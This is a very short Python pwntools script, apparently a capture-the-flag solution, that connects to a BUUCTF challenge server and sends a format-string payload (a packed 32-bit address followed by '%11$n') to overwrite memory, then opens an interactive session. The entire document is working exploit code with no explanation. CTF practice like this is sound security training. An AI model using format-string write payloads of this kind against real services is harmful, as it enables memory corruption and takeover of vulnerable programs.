from pwn import *

context.arch = 'i386'
r = remote("node3.buuoj.cn", 26564)
r.send(flat([0x0804A02C])+'%11$n')
r.interactive()